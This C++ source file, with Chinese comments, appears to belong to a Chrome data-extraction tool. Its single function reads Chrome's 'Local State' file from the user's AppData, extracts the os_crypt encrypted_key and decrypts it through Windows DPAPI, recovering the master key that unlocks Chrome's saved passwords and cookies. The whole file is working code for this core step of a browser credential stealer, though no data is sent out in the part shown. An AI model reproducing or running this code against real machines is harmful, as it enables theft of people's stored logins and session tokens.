//cpp
#include<vector>
#include<iostream>
#include<fstream>
#include<string>
#include<sstream>
//win
#include<Windows.h>
#include<tchar.h>
#include <shlobj.h>
//rapidjson
#include "3rdparts/rapidjson/document.h"


#include "chrome.h"
#include "crypto/crypto.h"
using namespace std;
using namespace rapidjson;

vector<unsigned char> getMasterkey() {
    string Encryptedkey;
	CHAR path[MAX_PATH] = "\\Google\\Chrome\\User Data\\Local State";

	TCHAR buffer[MAX_PATH];
	if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer) == S_OK)
	{
		strcat_s((char*)buffer, MAX_PATH, path);
		strcpy_s(path, MAX_PATH, (const char*)buffer);
	}
	else
	{
        cout << "Failed to get the path" << endl;
    }
//#define D1
#ifdef D1
    ifstream file(path);
    if (!file.is_open()) {
        cout << "Error opening file" << endl;
        // 可以添加其他处理方式，比如返回错误或者抛出异常
    }
    else {
        stringstream strbuffer;
        strbuffer << file.rdbuf();
        file.close();
        string jsonstr = strbuffer.str();

        cout << "JSON String: " << jsonstr << endl; // 输出读取的JSON字符串，用于确认是否正确读取了文件内容

        Document root;
        root.Parse(jsonstr.c_str());//字符串到json

        if (root.HasParseError()) {
            cout << "JSON parse error: " << endl;
            // 可以添加其他处理方式，比如返回错误或者抛出异常
        }
        else {
            Value& infoArray = root["os_crypt"];//json里找os_crypt

            if (infoArray.IsObject()) {
                if (infoArray.HasMember("encrypted_key") && infoArray["encrypted_key"].IsString()) {
                    Encryptedkey = infoArray["encrypted_key"].GetString();//os_cr
                    cout << "Encrypted Key: " << Encryptedkey << endl; // 输出加密密钥，用于确认是否成功获取了键值
                }
                else {
                    cout << "Error accessing encrypted_key" << endl;
                    // 可以添加其他处理方式，比如返回错误或者抛出异常
                }
            }
            else {
                cout << "os_crypt is not an object" << endl;
                // 可以添加其他处理方式，比如返回错误或者抛出异常
            }
        }
    }
#else

	ifstream file(path);
	stringstream strbuffer;
	strbuffer << file.rdbuf();
	file.close();
	string jsonstr = strbuffer.str();

	Document root;
	root.Parse(jsonstr.c_str());//字符串到json
	Value& infoArray = root["os_crypt"];//json里找os_crypt
	Encryptedkey = infoArray["encrypted_key"].GetString();//os_crypt找加密key转字符串回传给basekey变量
#endif
	vector<unsigned char> Decryptedkey;
	DecryptStringWithDPAPI(Encryptedkey, Decryptedkey);

	return Decryptedkey;
}

